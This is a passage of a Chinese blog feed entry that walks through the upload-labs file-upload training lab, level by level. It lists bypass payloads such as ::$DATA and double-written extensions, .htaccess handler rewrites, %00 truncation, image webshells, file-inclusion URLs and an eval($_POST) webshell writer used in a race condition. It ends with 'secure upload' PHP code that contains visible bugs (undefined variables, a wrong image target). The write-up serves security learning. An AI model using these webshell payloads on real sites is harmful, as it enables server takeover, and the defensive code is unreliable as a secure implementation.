href="https://www.cnblogs.com/linuxsec/articles/12152431.html">https://www.cnblogs.com/linuxsec/articles/12152431.html</a></p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200717095509735.png" alt="image-20200717095509735"></p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200716171248882.png" alt="image-20200717095703147"></p><h3 id="pass-01"><a href="#pass-01" class="headerlink" title="pass-01"></a>pass-01</h3><p>在console里找到前端验证代码，在burp里把后缀名改回来就好。</p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200716171248882.png" alt="image-20200716171248882"></p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200716171741323.png" alt="image-20200716171741323"></p><h3 id="pass-02"><a href="#pass-02" class="headerlink" title="pass-02"></a>pass-02</h3><p>验证虽然转移到了后端，但是规则却变得简单，只验证content-type，所以直接上传个php然后再burp里把content-type改成白名单里面的类型就好。</p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200716172253219.png" alt="image-20200716172253219"></p><h3 id="pass-03"><a href="#pass-03" class="headerlink" title="pass-03"></a>pass-03</h3><p>过滤规则，php的函数需要去查一查，这里用到的是windows+php的一个特性。<br>当把文件命名为<code>xxx.yyy::$DATAzzz</code>时，windows会把<code>::DATA</code>之后的部分当作文件的数据流，于是文件名被保存为<code>xxx.yyy</code>。<br>虽然这里有对<code>::$DATA</code>的过滤，但是可以被双写绕过。</p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200716173641821.png" alt="image-20200716173641821"></p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200716173618738.png" alt="image-20200716173618738"></p><h3 id="pass-04"><a href="#pass-04" class="headerlink" title="pass-04"></a>pass-04</h3><p><strong>::$DATA</strong></p><p><a href="https://blog.0kami.cn/2018/04/15/hitb-xctf-2018-portion-web-writeup/">https://blog.0kami.cn/2018/04/15/hitb-xctf-2018-portion-web-writeup/</a></p><p>一开始本来是想<code>::$DATA</code>绕过的，比如<code>filename=shell.php::$DATApng</code>,检查时识别出的扩展名是<code>.phppng</code>，php存储文件时会把文件命名为<code>shell.php::$DATApng</code>，然后由于windows+php的特性，<code>::$DATApng</code>会被丢弃。<br>但是没有实践成功，这里出现的问题是<code>::$DATA</code>之后添加字符会报错，要么像下面这样被解析为后面的文件名。<br><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200716193252913.png" alt="image-20200716193252913"></p><p><strong>.htaccess</strong></p><p><a href="https://www.jianshu.com/p/c674904a711e">https://www.jianshu.com/p/c674904a711e</a></p><p>上传.htaccess文件修改文件的解析规则</p><p>1.设置将文件名为shell的文件按php来解析</p><p><code>&lt;FilesMatch &quot;shell&quot;&gt;</code><br><code>SetHandler application/x-httpd-php Set&lt;/FilesMatch&gt;</code></p><p>2.将jpg文件按照php来解析</p><p><code>AddType application/x-httpd-php .jpg</code></p><p>3.htaccess自解析（未成功，没有htaccess的访问权限）</p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200716200635567.png" alt="image-20200716200635567"></p><h3 id="pass-05"><a href="#pass-05" class="headerlink" title="pass-05"></a>pass-05</h3><p>依然双写绕过</p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200716202858396.png" alt="image-20200716202858396"></p><h3 id="pass-06"><a href="#pass-06" class="headerlink" title="pass-06"></a>pass-06</h3><p>还能双写<code>::$DATA</code>绕过？！<br>确实还可以</p><h3 id="pass-07"><a href="#pass-07" class="headerlink" title="pass-07"></a>pass-07</h3><p>基本上ban掉了所有可以解析的后缀名，但是相对于之前的关卡，没有处理末尾的<code>.</code>，而php会自动忽略末尾的<code>.</code></p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200716212245934.png" alt="image-20200716212245934"></p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200716212132927.png" alt="image-20200716212132927"></p><h3 id="pass-08"><a href="#pass-08" class="headerlink" title="pass-08"></a>pass-08</h3><p>因为这里又是随机重命名，然后后缀名取得是处理后的字符串，所以又可以回到::$DATA绕过。</p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200716213324517.png" alt="image-20200716213324517"></p><h3 id="pass-09"><a href="#pass-09" class="headerlink" title="pass-09"></a>pass-09</h3><p>存储的文件名是上传名去<code>.</code>过后的，但是验证还要过滤掉一个空格，又结合前面忽略最后的<code>.</code>构造payload。（向大佬低头，没想出来）</p><p><code>filename=&quot;shell08.php. .&quot;</code></p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200716223751307.png" alt="image-20200716223751307"></p><h3 id="pass-10"><a href="#pass-10" class="headerlink" title="pass-10"></a>pass-10</h3><p>过滤php等关键字，由xss的思路，双写绕过。</p><p><code>filename=&quot;shell10.phphpp&quot;</code></p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200716224345049.png" alt="image-20200716224345049"></p><h3 id="pass-11"><a href="#pass-11" class="headerlink" title="pass-11"></a>pass-11</h3><p>虽然我也想到了%00字符截断，但是没有想起来%00会自动转码，而直接在burp里改hex会导致服务器报错。</p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200716232433594.png" alt="image-20200716232433594"></p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200716232619081.png" alt="image-20200716232619081"></p><h3 id="pass-12"><a href="#pass-12" class="headerlink" title="pass-12"></a>pass-12</h3><p>承接pass-11，由于这里save_path是POST过去的，所以需要在burp里面改hex。</p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200716233256871.png" alt="image-20200716233256871"></p><h3 id="pass-13"><a href="#pass-13" class="headerlink" title="pass-13"></a>pass-13</h3><p>先上传个图片马上去，因为只会检查文件的前两个字节，所以把前两个字节改成相应文件的格式头就好。<br>下一步是利用文件包含漏洞，利用upload-labs/include.php来解析刚刚上传的图片马。</p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200717102154922.png" alt="image-20200717102154922"></p><p>虽然刚刚上传的xxx.jpg是个”图片“，但是通过include.php的文件包含include 来解析时会按照php来解析。<br>[准确来说是按照服务器当前脚本语言来解析，文件包含机制是为了更好地支持代码重用]<br>虽然文件的内容并不是以&lt;?php开头，但是php会默认丢弃不规范的内容，从&lt;?php开始解析。</p><p>于是有payload=<code>/upload-labs/include.php?file=./upload/5120200717095119.jpg</code></p><p><strong>如果</strong>php开启了allow_url_include还可以直接在url中用php伪协议直接包含刚刚上传的图片马。</p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200717103529716.png" alt="image-20200717103529716"></p><h3 id="pass-14"><a href="#pass-14" class="headerlink" title="pass-14"></a>pass-14</h3><p><code>cmd&gt;copy image.png/b + shell.php/a shell.png</code></p><p>传是传上去了，也绕过了检测，但是文件包含之后不能解析，老是报错。</p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200717143714809.png" alt="image-20200717143714809"></p><p><strong>破案</strong>：大概是图片有点儿大，里面有些神奇字符破坏了php的解析。重新做一个小一点儿图片马就过了。</p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200717143646731.png" alt="image-20200717143646731"></p><h3 id="pass-15"><a href="#pass-15" class="headerlink" title="pass-15"></a>pass-15</h3><p>继续用pass-14的图片马，记得现在服务器的PHPstudy里把ph_exif开关打开。</p><p>依然不能解析利用。[解决方法同上]</p><h3 id="pass-16"><a href="#pass-16" class="headerlink" title="pass-16"></a>pass-16</h3><p>二次渲染</p><h3 id="pass-17"><a href="#pass-17" class="headerlink" title="pass-17"></a>pass-17</h3><p>直接上传shell.php改后缀名，然后文件包含。</p><h3 id="pass-18"><a href="#pass-18" class="headerlink" title="pass-18"></a>pass-18</h3><p>条件竞争</p><p>需要注意的是文件上传之后先以原文件名存储，然后再基于时间随机命名。<br>在存储之后到重命名之前，刚刚上传的文件是可以被我们主动访问到的（只要我们访问的时间足够巧）。</p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200717162914017.png" alt="image-20200717162914017"></p><p>那么就在这个图片里写个马儿，用这个马儿生成另外一个马儿供长期访问（不被重命名）。<br>写个python不断请求include.php去解析上传的图片希望能够生成马儿，因为时机稍纵即逝，所以上传图片这边也需要用Burp不断重发(手动还是自动intruder视环境而定)。一旦include.php解析图片成功，那么就可以访问生成的马儿了。</p><p><code>&lt;?php fputs(fopen(&#39;shell2.php&#39;,&#39;w&#39;),&#39;&lt;?php @eval($_POST[&quot;x&quot;])?&gt;&#39;);?&gt;</code></p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200717162713518.png" alt="image-20200717162713518"></p><h3 id="other"><a href="#other" class="headerlink" title="other"></a>other</h3><p>利用临时文件。</p><p><a href="https://www.cnblogs.com/linuxsec/articles/11278477.html">https://www.cnblogs.com/linuxsec/articles/11278477.html</a></p><p>虽然temp临时文件会在程序结束之后被删除，但是谁说程序总能正常结束呢？<br>使用文件包含功能不断地自我包含会导致php异常退出来处理错误，于是没有去删除临时文件，可以通过暴力猜测文件名访问到文件。</p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200718150214528.png" alt="image-20200718150214528"></p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200718145457471.png" alt="image-20200718145457471"></p><h3 id="课后作业：安全文件上传"><a href="#课后作业：安全文件上传" class="headerlink" title="课后作业：安全文件上传"></a>课后作业：安全文件上传</h3><p>这里通过两种手段尝试实现文件上传过程中的防御。</p><h4 id="白名单-随机重命名"><a href="#白名单-随机重命名" class="headerlink" title="白名单+随机重命名"></a>白名单+随机重命名</h4><p>文件的存储路径已经通过预定义的方式被系统控制，然后通过随机重命名控制文件的名称，最后基于白名单严格控制文件的扩展名。<br>在没有文件包含或者.htaccess解析漏洞的前提下，文件上传是安全的。</p><h4 id="重采样-头部元数据检测"><a href="#重采样-头部元数据检测" class="headerlink" title="重采样+头部元数据检测"></a>重采样+头部元数据检测</h4><p>在存在文件包含或者.htaccess解析漏洞时，第一个方法可以被图片马绕过。<br>图片马攻击成功的本质是图片二进制数据包含php语句且该图片以php格式被解析，由于预设已经存在解析漏洞，那么只能在php语句检测上想办法。<br>利用php-GD扩展的imageCopyResampled()通过像素插值算法修改图片元数据，可以破坏php语句。但是这还不够，因为图片数据中往往存在一部分辅助数据不受重采样的影响，而php语句可以被注入到这些辅助数据块中免于被破环。<br>于是，可以通过检测辅助数据块的方式检测其中的php语句。辅助数据快往往存在于文件流的头部且长度较小，虽然从格式标准而言辅助数据块可以很长，但是一般情况下是较短的，如果被恶意构造得很长，可以武断地判为恶意图片。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;../config.php&#x27;</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;../head.php&#x27;</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;../menu.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">random_name</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$t</span>=time();</span><br><span class="line">    <span class="variable">$new_name</span>=date(<span class="string">&quot;Ymd&quot;</span>,<span class="variable">$t</span>);</span><br><span class="line">    <span class="variable">$allchar</span> = <span class="string">&quot;abcdefghijklnmopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span> ; </span><br><span class="line">    srand(mktime());</span><br><span class="line">    <span class="keyword">for</span>( <span class="variable">$i</span>=<span class="number">1</span>;<span class="variable">$i</span>&lt;=<span class="number">8</span>;<span class="variable">$i</span>++)&#123;</span><br><span class="line">        <span class="variable">$new_name</span>.=substr(<span class="variable">$allchar</span>,rand()%<span class="number">52</span>,<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$new_name</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getExt</span>(<span class="params"><span class="variable">$orign_file_name</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$ext</span>=strrchr(<span class="variable">$orign_file_name</span>,<span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">    <span class="variable">$ext</span>=trim(<span class="variable">$ext</span>);</span><br><span class="line">    <span class="variable">$ext</span>=strtolower(<span class="variable">$ext</span>);</span><br><span class="line">    <span class="variable">$white_list</span>=<span class="keyword">array</span>(<span class="string">&quot;.jpg&quot;</span>,<span class="string">&quot;.png&quot;</span>,<span class="string">&quot;.jpeg&quot;</span>,<span class="string">&quot;.pdf&quot;</span>,<span class="string">&quot;.doc&quot;</span>,<span class="string">&quot;.docx&quot;</span>,<span class="string">&quot;.md&quot;</span>,<span class="string">&quot;.txt&quot;</span>,<span class="string">&quot;.ppt&quot;</span>,<span class="string">&quot;.pttx&quot;</span>,<span class="string">&quot;.xls&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(in_array(<span class="variable">$ext</span>,<span class="variable">$white_list</span>))&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$ext</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;unknown&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">reCodeImg</span>(<span class="params"><span class="variable">$tmpImg</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;<span class="comment">//我们在这里针对性地检查图片马，具体使用重采样和固定元数据内容敏感检测结合的方法</span></span><br><span class="line"><span class="comment">//首先重采样，破坏图片内容中的shell语句</span></span><br><span class="line"><span class="variable">$newTmpImg</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$x</span>=imagesx(<span class="variable">$tmpImg</span>);</span><br><span class="line"><span class="variable">$y</span>=imagesy(<span class="variable">$tmpImg</span>);</span><br><span class="line">imagecopyresampled(<span class="variable">$newTmpImg</span>, <span class="variable">$tmpImg</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="variable">$x</span>, <span class="variable">$y</span>, <span class="variable">$x</span>, <span class="variable">$y</span>);</span><br><span class="line"><span class="variable">$handler</span>=fopen(<span class="variable">$newTmpImg</span>,<span class="string">&quot;r&quot;</span>);</span><br><span class="line"><span class="variable">$metadata</span>=fread(<span class="variable">$handler</span>,<span class="number">2048</span>);</span><br><span class="line"><span class="keyword">if</span>(!strrpos(<span class="variable">$meat</span>,<span class="string">&quot;IDAT&quot;</span>) <span class="keyword">or</span> strripos(<span class="variable">$metadata</span>, <span class="string">&quot;php&quot;</span>))&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;Error&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$newTmpImg</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span>(!is_uploaded_file(<span class="variable">$temp_file</span>))&#123;</span><br><span class="line">        <span class="variable">$msg</span>=<span class="string">&quot;上传错误！&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> ;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$new_file_name</span>=random_name();</span><br><span class="line">        <span class="variable">$new_file_ext</span> =getExt(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$new_file_ext</span>==<span class="string">&quot;unknown&quot;</span>)&#123;</span><br><span class="line">            <span class="variable">$msg</span>=<span class="string">&quot;未知图片类型，不能上传&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(in_array(<span class="variable">$new_file_ext</span>, <span class="keyword">array</span>(<span class="string">&quot;.jpg&quot;</span>,<span class="string">&quot;.png&quot;</span>,<span class="string">&quot;.jpeg&quot;</span>)))&#123;<span class="comment">//针对性地检查图片文件</span></span><br><span class="line">        <span class="variable">$temp_file</span>=reCodeImg(<span class="variable">$temp_file</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$temp_file</span>==<span class="string">&quot;Error&quot;</span>)&#123;</span><br><span class="line">        <span class="variable">$msg</span>=<span class="string">&quot;检测到恶意语句&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> ;</span><br><span class="line">        &#125;</span><br><span class="line">        &#125;</span><br><span class="line">            <span class="variable">$new_file_path</span>= UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$new_file_name</span> . <span class="variable">$new_file_ext</span>;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>))&#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;很久之前的实训课程实验记录，权当凑数。&lt;/p&gt;</summary>
    
    
    
    
    <category term="CTF" scheme="http://slient2009.github.io/tags/CTF/"/>
    
  </entry>
  
</feed>
